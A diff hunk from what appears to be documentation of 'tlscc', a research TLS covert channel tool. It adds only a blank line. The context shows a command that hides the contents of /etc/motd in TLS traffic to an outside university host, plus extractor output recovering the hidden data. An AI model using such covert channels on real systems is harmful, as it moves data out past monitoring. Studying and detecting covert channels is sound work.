@@ -73,6 +73,7 @@ $ ./tlscc -qh www.fernuni-hagen.de -f /etc/motd
 Trying 132.176.XXX.XXX... Success!  
 
 The extractor should see the connection and extract the covert data.  
+
 TLS hello detected, tracking connection...  
 Found TLS covert channel signature in connection 192.168.0.100:39318 -> 132.176.XXX.XXX:443  
 [IV-FILE] extract.motd.IV.2 (286 bytes)  
